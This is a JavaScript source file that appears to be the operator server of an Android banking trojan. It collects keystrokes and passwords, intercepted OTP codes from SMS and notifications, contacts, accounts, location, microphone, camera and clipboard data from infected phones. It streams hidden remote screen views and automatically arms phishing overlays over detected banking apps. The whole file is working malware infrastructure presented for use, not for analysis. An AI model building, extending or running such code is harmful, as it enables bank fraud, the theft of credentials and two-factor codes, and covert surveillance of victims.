'use strict';
const WebSocket         = require('ws');
const { v4: uuidv4 }    = require('uuid');
const { run, get, all } = require('./db');
const { encodeVncFrame } = require('./protocol');
const { detectApps, extract2FA } = require('./detector');

// ── Live maps ──────────────────────────────────────────────────────────────────
const devices    = new Map();  // devId → WebSocket
const operators  = new Map();  // opId  → WebSocket
const vncSubs    = new Map();  // devId → Set<WebSocket>  (VNC / accessibility mode)
const vncV2Subs  = new Map();  // devId → Set<WebSocket>  (V2 / MediaProjection mode)

// ── Helpers ────────────────────────────────────────────────────────────────────
const sleep    = ms => new Promise(r => setTimeout(r, ms));
const tryJSON  = (s, fb = null) => { try { return JSON.parse(s); } catch { return fb; } };
const sendJson = (ws, o) => {
  if (ws.readyState === WebSocket.OPEN)
    try { ws.send(JSON.stringify(o)); } catch {}
};

function broadcast(obj) {
  const msg = JSON.stringify(obj);
  for (const ws of operators.values())
    if (ws.readyState === WebSocket.OPEN)
      try { ws.send(msg); } catch {}
}

function makeDevIdBuf(id) {
  const buf = Buffer.alloc(36, 0);
  Buffer.from(id, 'utf8').copy(buf, 0, 0, Math.min(id.length, 36));
  return buf;
}

// ── VNC frame forward (primary — accessibility) ────────────────────────────────
function forwardVnc(devId, devIdBuf, jpeg) {
  const subs = vncSubs.get(devId);
  if (!subs || !subs.size) return;
  const frame = encodeVncFrame(devIdBuf, jpeg);
  for (const ws of subs)
    if (ws.readyState === WebSocket.OPEN)
      try { ws.send(frame); } catch {}
}

// ── VNC V2 frame forward (MediaProjection) ─────────────────────────────────────
// V2 frames arrive from APK tagged type=vnc_v2_frame.
// We forward them as ArrayBuffer with a 1-byte type prefix: 0x02.
function forwardVncV2(devId, jpeg) {
  const subs = vncV2Subs.get(devId);
  if (!subs || !subs.size) return;
  const header = Buffer.alloc(1);
  header[0] = 0x02;
  const frame = Buffer.concat([header, jpeg]);
  for (const ws of subs)
    if (ws.readyState === WebSocket.OPEN)
      try { ws.send(frame); } catch {}
}

// ── Offline command queue ──────────────────────────────────────────────────────
async function enqueueCmd(devId, cmd, args = {}) {
  await run(`INSERT INTO cmd_queue(dev_id,cmd,args) VALUES(?,?,?)`,
    [devId, cmd, JSON.stringify(args)]);
}

async function flushQueue(devId, ws) {
  const rows = await all(
    `SELECT id,cmd,args FROM cmd_queue WHERE dev_id=? ORDER BY id ASC`, [devId]);
  if (!rows.length) return;
  for (const r of rows) {
    if (ws.readyState !== WebSocket.OPEN) break;
    sendJson(ws, { action: r.cmd, type: r.cmd, ...tryJSON(r.args, {}) });
    await sleep(30);
  }
  await run(`DELETE FROM cmd_queue WHERE dev_id=?`, [devId]);
}

// ── Auto-deploy overlays ───────────────────────────────────────────────────────
async function autoDeployOverlays(devId, ws) {
  const overlays = await all(`SELECT * FROM overlays WHERE auto_deploy=1`);
  if (!overlays.length) return;
  await sleep(2000);
  for (const ov of overlays) {
    if (ws.readyState !== WebSocket.OPEN) break;
    sendJson(ws, {
      type: 'cmd', cmd: 'ARM_OVERLAY_MAPPING',
      args: { package: ov.package_name, html: ov.html, name: ov.name }
    });
    await run(
      `INSERT OR REPLACE INTO overlay_deployments(dev_id,overlay_id,package,status) VALUES(?,?,?,?)`,
      [devId, ov.id, ov.package_name, 'armed']);
    await sleep(150);
  }
  if (overlays.length)
    broadcast({ type: 'overlays_auto_armed', dev_id: devId, count: overlays.length });
}

// ── App detection ──────────────────────────────────────────────────────────────
async function runDetection(devId, apps) {
  const { financial, social } = detectApps(apps);
  for (const d of [...financial, ...social]) {
    await run(
      `INSERT OR REPLACE INTO app_detections(dev_id,package,name,category,type,country,detected) VALUES(?,?,?,?,?,?,?)`,
      [devId, d.package, d.name,
       financial.includes(d) ? 'financial' : 'social',
       d.type, d.country || null, d.detected]);
  }
  await run(`UPDATE devices SET fin_count=?, social_count=? WHERE id=?`,
    [financial.length, social.length, devId]);
  broadcast({
    type: 'detection_update', id: devId,
    financial, social,
    fin_count: financial.length, social_count: social.length,
  });
}

// ── Device upsert / offline ────────────────────────────────────────────────────
async function upsertDevice(id, info) {
  const sw = info.screen_w || info.screenWidth  || 1080;
  const sh = info.screen_h || info.screenHeight || 1920;
  await run(
    `INSERT INTO devices(id,info,online,last_seen,screen_w,screen_h)
     VALUES(?,?,1,strftime('%s','now'),?,?)
     ON CONFLICT(id) DO UPDATE SET
       info=excluded.info, online=1, last_seen=excluded.last_seen,
       screen_w=excluded.screen_w, screen_h=excluded.screen_h`,
    [id, JSON.stringify(info), sw, sh]);
}

async function setOffline(id) {
  await run(
    `UPDATE devices SET online=0, last_seen=strftime('%s','now'), vnc_active=0 WHERE id=?`, [id]);
}

// ── Device message router ──────────────────────────────────────────────────────
async function routeDevMsg(devId, devIdBuf, ws, raw, isBinary) {
  if (devices.get(devId) !== ws) return;

  if (isBinary) {
    let buf = Buffer.isBuffer(raw) ? raw : Buffer.from(raw);
    // APK binary frame: [0x01][4B len][JPEG]
    if (buf.length > 5 && buf[0] === 0x01) buf = buf.subarray(5);
    forwardVnc(devId, devIdBuf, buf);
    return;
  }

  let msg;
  try { msg = JSON.parse(raw); } catch { return; }

  const type   = (msg.type || msg.action || '').toLowerCase().trim();
  const rawData = msg.data;
  const data    = (typeof rawData === 'string') ? tryJSON(rawData, rawData) : rawData;

  switch (type) {

    case 'handshake': case 'device_info': case 'device_info_response': {
      let info = (data && typeof data === 'object' && !Array.isArray(data))
        ? { ...data } : { ...msg };
      delete info.type; delete info.action; delete info.data;
      await upsertDevice(devId, info);
      broadcast({ type: 'device_update', id: devId, info });
      break;
    }

    case 'ping': sendJson(ws, { type: 'pong' }); break;
    case 'pong': case 'heartbeat': ws._alive = true; break;

    case 'vnc_frame': case 'screen_frame': case 'hvnc_frame':
    case 'silent_frame': case 'screen_capture': {
      const b64 = (data && typeof data === 'object') ? data.data : data;
      if (typeof b64 === 'string' && b64.length > 0)
        forwardVnc(devId, devIdBuf, Buffer.from(b64, 'base64'));
      break;
    }

    // ── V2 frame (MediaProjection-based) ────────────────────────────────────
    case 'vnc_v2_frame': case 'screen_v2_frame': case 'projection_frame': {
      const b64 = (data && typeof data === 'object') ? data.data : data;
      if (typeof b64 === 'string' && b64.length > 0)
        forwardVncV2(devId, Buffer.from(b64, 'base64'));
      break;
    }

    case 'keylog': {
      const keylogObj  = (data && typeof data === 'object') ? data : {};
      const keystrokes = Array.isArray(keylogObj.keystrokes) ? keylogObj.keystrokes : null;
      if (keystrokes && keystrokes.length > 0) {
        for (const k of keystrokes) {
          const app = k.app || k.app_name || '';
          const pkg = k.pkg || '';
          const text = k.text || '';
          const isPass = !!k.is_password;
          await run(`INSERT INTO keylogs(dev_id,app,pkg,text,is_password) VALUES(?,?,?,?,?)`,
            [devId, app, pkg, text, isPass ? 1 : 0]);
          broadcast({ type: 'keylog', id: devId, data: { app, pkg, text, is_password: isPass, ts: k.ts || Date.now() } });
        }
      } else {
        const app    = keylogObj.app  || '';
        const pkg    = keylogObj.pkg  || keylogObj.package || '';
        const text   = keylogObj.text || keylogObj.data || (typeof data === 'string' ? data : '');
        const isPass = !!keylogObj.is_password;
        await run(`INSERT INTO keylogs(dev_id,app,pkg,text,is_password) VALUES(?,?,?,?,?)`,
          [devId, app, pkg, text, isPass ? 1 : 0]);
        broadcast({ type: 'keylog', id: devId, data: { app, pkg, text, is_password: isPass, ts: Date.now() } });
      }
      break;
    }

    case 'screenshot': case 'snap': {
      const imgData = data?.data || data?.image || data;
      if (typeof imgData === 'string' && imgData.length > 0) {
        const result = await run(`INSERT INTO screenshots(dev_id,data) VALUES(?,?)`, [devId, imgData]);
        broadcast({ type: 'screenshot_new', id: devId, ss_id: result.lastID });
      }
      break;
    }

    case 'notification': case 'notification_intercepted': {
      const app   = data?.app     || data?.packageName || '';
      const pkg   = data?.package || data?.pkg         || app;
      const title = data?.title   || '';
      const text  = data?.body    || data?.text        || data?.content || '';
      const otp   = data?.otp_code || extract2FA(title + ' ' + text);
      await run(
        `INSERT INTO notifications(dev_id,app,package,title,text,is_otp,otp_code) VALUES(?,?,?,?,?,?,?)`,
        [devId, app, pkg, title, text, otp ? 1 : 0, otp || null]);
      broadcast({
        type: 'notification', id: devId,
        data: { app, pkg, title, text, is_otp: !!otp, otp_code: otp, ts: Date.now() }
      });
      if (otp) broadcast({ type: 'otp_intercepted', id: devId, otp, app, title });
      break;
    }

    case 'sms_list': case 'get_sms_response': case 'sms': {
      const list = Array.isArray(data) ? data : (data?.sms || data?.list || []);
      await run(
        `INSERT INTO device_sms(dev_id,data) VALUES(?,?)
         ON CONFLICT(dev_id) DO UPDATE SET data=excluded.data, ts=strftime('%s','now')`,
        [devId, JSON.stringify(list)]);
      for (const sms of list) {
        const body = sms.body || sms.text || '';
        const otp  = extract2FA(body);
        if (otp) {
          const from = sms.address || sms.from || '';
          broadcast({ type: 'otp_intercepted', id: devId, otp, app: 'SMS', title: from, text: body });
        }
      }
      broadcast({ type: 'sms_update', id: devId, count: list.length });
      break;
    }

    case 'contacts': case 'get_contacts_response': {
      const list = Array.isArray(data) ? data : (data?.contacts || []);
      await run(
        `INSERT INTO device_contacts(dev_id,data) VALUES(?,?)
         ON CONFLICT(dev_id) DO UPDATE SET data=excluded.data, ts=strftime('%s','now')`,
        [devId, JSON.stringify(list)]);
      broadcast({ type: 'contacts_update', id: devId, count: list.length });
      break;
    }

    case 'installed_apps': case 'get_installed_apps_response': {
      const list = Array.isArray(data) ? data : (data?.apps || []);
      await run(
        `INSERT INTO device_apps(dev_id,data) VALUES(?,?)
         ON CONFLICT(dev_id) DO UPDATE SET data=excluded.data, ts=strftime('%s','now')`,
        [devId, JSON.stringify(list)]);
      broadcast({ type: 'apps_update', id: devId, count: list.length });
      runDetection(devId, list).catch(e => console.error('[detect]', e.message));
      break;
    }

    case 'accounts': case 'google_accounts': case 'get_accounts_response': {
      const list = Array.isArray(data) ? data : (data?.accounts || []);
      await run(
        `INSERT INTO device_accounts(dev_id,data) VALUES(?,?)
         ON CONFLICT(dev_id) DO UPDATE SET data=excluded.data, ts=strftime('%s','now')`,
        [devId, JSON.stringify(list)]);
      broadcast({ type: 'accounts_update', id: devId, data: list });
      break;
    }

    case 'location': case 'get_location_response': {
      const lat      = data?.lat ?? data?.latitude;
      const lng      = data?.lng ?? data?.longitude;
      const accuracy = data?.accuracy || null;
      const address  = data?.address  || null;
      if (lat != null && lng != null) {
        await run(
          `INSERT INTO device_location(dev_id,lat,lng,accuracy,address) VALUES(?,?,?,?,?)`,
          [devId, lat, lng, accuracy, address]);
        broadcast({ type: 'location_update', id: devId, lat, lng, accuracy, address });
      }
      break;
    }

    case 'calls': case 'call_logs': case 'get_calls_response': {
      const list = Array.isArray(data) ? data : (data?.calls || []);
      await run(
        `INSERT INTO device_calls(dev_id,data) VALUES(?,?)
         ON CONFLICT(dev_id) DO UPDATE SET data=excluded.data, ts=strftime('%s','now')`,
        [devId, JSON.stringify(list)]);
      broadcast({ type: 'calls_update', id: devId, count: list.length });
      break;
    }

    case 'mic': case 'audio_chunk': case 'mic_chunk': case 'mic_audio': {
      const chunk  = data?.chunk || (typeof data === 'string' ? data : null);
      const format = data?.format || 'pcm';
      const rate   = data?.sample_rate || 16000;
      if (chunk && chunk.length > 0)
        broadcast({ type: 'mic_chunk', id: devId, data: { chunk, format, sample_rate: rate, ts: Date.now() } });
      break;
    }

    case 'camera': case 'camera_frame': case 'cam_frame': {
      const frame  = data?.frame || data?.image || (typeof data === 'string' ? data : null);
      const facing = data?.facing || 'front';
      if (frame && frame.length > 0)
        broadcast({ type: 'camera_frame', id: devId, data: { frame, facing, ts: Date.now() } });
      break;
    }

    case 'file': case 'file_list': case 'get_files_response': {
      // hub stores file list + broadcasts for Files tab
      const files = Array.isArray(data) ? data : (data?.files ? data.files : [data]);
      // Store as a single blob keyed by dev_id+path for fast lookup
      const path = msg.path || data?.path || '/';
      await run(
        `INSERT INTO file_listings(dev_id,path,data) VALUES(?,?,?)
         ON CONFLICT(dev_id,path) DO UPDATE SET data=excluded.data, ts=strftime('%s','now')`,
        [devId, path, JSON.stringify(files)]);
      for (const f of files) {
        if (!f?.name) continue;
        await run(`INSERT INTO files(dev_id,name,size,path) VALUES(?,?,?,?)`,
          [devId, f.name, f.size || 0, f.path || '']);
      }
      broadcast({ type: 'file_update', id: devId, path, count: files.length });
      break;
    }

    case 'silent_vnc_status': {
      broadcast({ type: 'silent_vnc_status', id: devId, active: msg.active, method: msg.method || 'silent' });
      break;
    }

    case 'device_status': {
      const pkg     = msg.package || '';
      const appName = msg.appName || '';
      const locked  = !!msg.isLocked;
      const screenOn = !!msg.isScreenOn;
      broadcast({ type: 'device_status', id: devId, pkg, appName, locked, screenOn });
      break;
    }

    case 'screen_hierarchy': {
      broadcast({ type: 'screen_hierarchy', id: devId, data: data || msg.data || '' });
      break;
    }

    case 'unlock': case 'unlock_sequence': {
      const sequence = data || msg.data || '';
      await run(`INSERT INTO events(dev_id,type,data) VALUES(?,?,?)`,
        [devId, 'unlock_sequence', JSON.stringify({ sequence, ts: Date.now() })]);
      broadcast({ type: 'unlock_sequence', id: devId, data: sequence });
      break;
    }

    case 'bank_balance': {
      const balance     = msg.balance || '';
      const pkg         = msg.package || '';
      const accountInfo = msg.accountInfo || '';
      await run(`INSERT INTO events(dev_id,type,data) VALUES(?,?,?)`,
        [devId, 'bank_balance', JSON.stringify({ pkg, balance, accountInfo, ts: Date.now() })]);
      broadcast({ type: 'bank_balance', id: devId, pkg, balance, accountInfo, ts: Date.now() });
      break;
    }

    case 'fake_call_status':
      broadcast({ type: 'fake_call_status', id: devId, status: msg.status, callerName: msg.callerName });
      break;

    case 'keylog_offline': {
      const text   = data || msg.data || '';
      const app    = msg.app || '';
      const pkg    = msg.pkg || '';
      const isPass = msg.is_password || false;
      await run(`INSERT INTO keylogs(dev_id,app,pkg,text,is_password) VALUES(?,?,?,?,?)`,
        [devId, app, pkg, text, isPass ? 1 : 0]);
      broadcast({ type: 'keylog', id: devId, data: { app, pkg, text, is_password: isPass, ts: Date.now() } });
      break;
    }

    case 'studio_form_data': {
      const formData = data || msg.data || {};
      const projId   = msg.project_id || '';
      await run(`INSERT INTO events(dev_id,type,data) VALUES(?,?,?)`,
        [devId, 'studio_form_data', JSON.stringify({ formData, projId, ts: Date.now() })]);
      broadcast({ type: 'studio_form_data', id: devId, data: formData, project_id: projId });
      break;
    }

    case 'clipboard': {
      const text = data?.text || data?.content || data || '';
      await run(`INSERT INTO events(dev_id,type,data) VALUES(?,?,?)`,
        [devId, 'clipboard', JSON.stringify({ text, ts: Date.now() })]);
      broadcast({ type: 'event', id: devId, evt: 'clipboard', data: { text, ts: Date.now() } });
      break;
    }

    case 'bypass_status': {
      broadcast({ type: 'bypass_status', dev_id: devId, status: data?.status || msg.status, data: data || {} });
      break;
    }

    case 'bypass_status_full':
      broadcast({ type: 'bypass_status', dev_id: devId, status: 'LIVE', data: msg });
      break;

    default:
      await run(`INSERT INTO events(dev_id,type,data) VALUES(?,?,?)`,
        [devId, type || 'unknown', JSON.stringify(msg)]);
      broadcast({ type: 'event', id: devId, evt: type, data: msg });
  }
}

// ── Device WS handler ─────────────────────────────────────────────────────────
async function handleDevice(ws, req) {
  const devId    = ((req.headers['x-device-id'] || '').trim() || uuidv4()).slice(0, 64);
  const devIdBuf = makeDevIdBuf(devId);

  ws._devId    = devId;
  ws._alive    = true;
  ws._lastPing = Date.now();

  const stale = devices.get(devId);
  if (stale && stale !== ws && stale.readyState !== WebSocket.CLOSED) {
    console.log(`[~] ${devId.slice(0,8)} replacing stale connection`);
    stale._replaced = true;
    stale.terminate();
  }

  let info = {};
  try { info = JSON.parse(req.headers['x-device-info'] || '{}'); } catch {}

  await upsertDevice(devId, info);
  devices.set(devId, ws);
  broadcast({ type: 'device_online', id: devId, info });
  console.log(`[+] ${devId.slice(0,8)} connected (${req.headers['x-forwarded-for'] || req.socket.remoteAddress})`);

  flushQueue(devId, ws).catch(() => {});
  autoDeployOverlays(devId, ws).catch(() => {});

  ws.on('message', (data, isBinary) =>
    routeDevMsg(devId, devIdBuf, ws, data, isBinary).catch(e =>
      console.error(`[dev ${devId.slice(0,8)}]`, e.message)));

  ws.on('pong', () => { ws._alive = true; ws._lastPing = Date.now(); });

  ws.on('close', async () => {
    if (ws._replaced) return;
    if (devices.get(devId) !== ws) return;
    devices.delete(devId);
    vncSubs.delete(devId);
    vncV2Subs.delete(devId);
    await setOffline(devId);
    broadcast({ type: 'device_offline', id: devId });
    console.log(`[-] ${devId.slice(0,8)} disconnected`);
  });

  ws.on('error', e => console.error(`[dev ${devId.slice(0,8)}]`, e.message));
}

// ── Operator WS handler ────────────────────────────────────────────────────────
async function handleOperator(ws, req) {
  const opId = uuidv4();
  ws._opId  = opId;
  ws._alive = true;
  operators.set(opId, ws);

  // Hydrate
  try {
    const rows  = await all(`SELECT * FROM devices ORDER BY online DESC, last_seen DESC`);
    const stats = await Promise.all([
      get(`SELECT COUNT(*) n FROM devices WHERE online=1`),
      get(`SELECT COUNT(*) n FROM cmd_queue`),
      get(`SELECT COUNT(*) n FROM notifications WHERE is_otp=1`),
    ]);
    sendJson(ws, {
      type:    'init',
      devices: rows.map(normalizeDevice),
      stats:   {
        online:      stats[0]?.n || 0,
        queued_cmds: stats[1]?.n || 0,
        otp_count:   stats[2]?.n || 0,
        operators:   operators.size,
        total:       rows.length,
      }
    });
  } catch (e) { console.error('[op init]', e.message); }

  ws.on('message', raw => {
    let msg;
    try { msg = JSON.parse(raw); } catch { return; }
    const { type, target, payload, devId, cmd: msgCmd, args: msgArgs } = msg;

    switch (type) {

      case 'cmd': {
        const cmd  = payload?.cmd  || msgCmd;
        const args = payload?.args || msgArgs || {};
        if (!cmd) return;
        const dev = devices.get(target);
        if (dev && dev.readyState === WebSocket.OPEN) {
          sendJson(dev, { action: cmd, type: cmd, ...args });
          sendJson(ws,  { type: 'cmd_ack', target, cmd, delivered: true });
        } else {
          enqueueCmd(target, cmd, args).catch(() => {});
          sendJson(ws, { type: 'cmd_queued', target, cmd });
        }
        break;
      }

      case 'broadcast_cmd': {
        const cmd  = payload?.cmd  || msgCmd;
        const args = payload?.args || msgArgs || {};
        if (!cmd) return;
        const pkt = JSON.stringify({ action: cmd, type: cmd, ...args });
        let sent = 0;
        for (const dws of devices.values())
          if (dws.readyState === WebSocket.OPEN) { dws.send(pkt); sent++; }
        sendJson(ws, { type: 'broadcast_ack', cmd, sent });
        break;
      }

      // ── VNC (accessibility) subscribe ──────────────────────────────────────
      case 'vnc_subscribe': {
        const id = devId || target;
        if (!id) break;
        if (!vncSubs.has(id)) vncSubs.set(id, new Set());
        vncSubs.get(id).add(ws);
        const dev = devices.get(id);
        const quality = msg.quality || 30;
        if (dev && dev.readyState === WebSocket.OPEN)
          sendJson(dev, { action: 'START_SILENT_VNC', type: 'START_SILENT_VNC', enabled: true, quality });
        run(`UPDATE devices SET vnc_active=1 WHERE id=?`, [id]).catch(() => {});
        break;
      }

      case 'vnc_unsubscribe': {
        const id = devId || target;
        if (!id) break;
        const subs = vncSubs.get(id);
        if (subs) {
          subs.delete(ws);
          if (!subs.size) {
            const dev = devices.get(id);
            if (dev && dev.readyState === WebSocket.OPEN)
              sendJson(dev, { action: 'STOP_SILENT_VNC', type: 'STOP_SILENT_VNC', enabled: false });
            run(`UPDATE devices SET vnc_active=0 WHERE id=?`, [id]).catch(() => {});
          }
        }
        break;
      }

      // ── VNC V2 (MediaProjection) subscribe ────────────────────────────────
      case 'vnc_v2_subscribe': {
        const id = devId || target;
        if (!id) break;
        if (!vncV2Subs.has(id)) vncV2Subs.set(id, new Set());
        vncV2Subs.get(id).add(ws);
        const dev = devices.get(id);
        const quality = msg.quality || 30;
        if (dev && dev.readyState === WebSocket.OPEN)
          // APK side: START_SCREEN_CAPTURE triggers MediaProjection-based capture
          sendJson(dev, { action: 'START_SCREEN_CAPTURE', type: 'START_SCREEN_CAPTURE', enabled: true, quality });
        break;
      }

      case 'vnc_v2_unsubscribe': {
        const id = devId || target;
        if (!id) break;
        const subs = vncV2Subs.get(id);
        if (subs) {
          subs.delete(ws);
          if (!subs.size) {
            const dev = devices.get(id);
            if (dev && dev.readyState === WebSocket.OPEN)
              sendJson(dev, { action: 'STOP_SCREEN_CAPTURE', type: 'STOP_SCREEN_CAPTURE', enabled: false });
          }
        }
        break;
      }

      case 'ping_op':
        sendJson(ws, { type: 'pong_op', ts: Date.now() });
        break;
    }
  });

  ws.on('pong', () => { ws._alive = true; });

  ws.on('close', () => {
    operators.delete(opId);
    for (const [dId, subs] of vncSubs) {
      subs.delete(ws);
      if (!subs.size) {
        const dev = devices.get(dId);
        if (dev && dev.readyState === WebSocket.OPEN)
          sendJson(dev, { action: 'STOP_SILENT_VNC', type: 'STOP_SILENT_VNC', enabled: false });
        run(`UPDATE devices SET vnc_active=0 WHERE id=?`, [dId]).catch(() => {});
      }
    }
    for (const [dId, subs] of vncV2Subs) {
      subs.delete(ws);
      if (!subs.size) {
        const dev = devices.get(dId);
        if (dev && dev.readyState === WebSocket.OPEN)
          sendJson(dev, { action: 'STOP_SCREEN_CAPTURE', type: 'STOP_SCREEN_CAPTURE', enabled: false });
      }
    }
  });

  ws.on('error', e => console.error(`[op ${opId.slice(0,8)}]`, e.message));
}

// ── Normalize device row ───────────────────────────────────────────────────────
function normalizeDevice(r) {
  return {
    ...r,
    info:       tryJSON(r.info, {}),
    tags:       tryJSON(r.tags, []),
    online:     r.online === 1,
    vnc_active: r.vnc_active === 1,
  };
}

// ── Heartbeat: device + operator ───────────────────────────────────────────────
const DEVICE_HB_MS   = 20_000;
const OPERATOR_HB_MS = 30_000;

setInterval(() => {
  for (const [id, ws] of devices) {
    if (!ws._alive) {
      console.log(`[hb] ${id.slice(0,8)} timeout — terminating`);
      ws.terminate();
      continue;
    }
    ws._alive = false;
    if (ws.readyState === WebSocket.OPEN) ws.ping();
  }
}, DEVICE_HB_MS);

setInterval(() => {
  for (const [, ws] of operators) {
    if (!ws._alive) { ws.terminate(); continue; }
    ws._alive = false;
    if (ws.readyState === WebSocket.OPEN) ws.ping();
  }
}, OPERATOR_HB_MS);

// ── Periodic stats broadcast ───────────────────────────────────────────────────
setInterval(async () => {
  if (!operators.size) return;
  try {
    const [online, queued, total] = await Promise.all([
      get(`SELECT COUNT(*) n FROM devices WHERE online=1`),
      get(`SELECT COUNT(*) n FROM cmd_queue`),
      get(`SELECT COUNT(*) n FROM devices`),
    ]);
    broadcast({
      type:         'stats_tick',
      online:       online?.n  || 0,
      queued_cmds:  queued?.n  || 0,
      total:        total?.n   || 0,
      operators:    operators.size,
      devices_live: devices.size,
      ts:           Date.now(),
    });
  } catch {}
}, 10_000);

module.exports = {
  handleDevice, handleOperator,
  devices, operators, vncSubs, vncV2Subs,
  enqueueCmd, broadcast, normalizeDevice,
};
